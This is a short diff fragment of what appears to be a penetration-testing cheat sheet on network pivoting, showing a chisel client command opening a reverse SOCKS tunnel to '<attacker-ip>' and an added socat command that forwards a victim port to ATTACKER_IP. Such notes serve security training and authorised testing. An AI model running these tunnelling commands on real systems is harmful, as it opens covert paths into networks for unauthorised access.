@@ -29,3 +29,8 @@ Chisel
 #connect chisel server
 ./chisel client '<attacker-ip>:<attacker-port>' R:socks
 ```
+
+Socat
+```powershell
+.\socat.exe tcp-listen:{VICTIM_PORT},reuseaddr,fork tcp:{ATTACKER_IP}:{ATTACKER_PORT}
+```
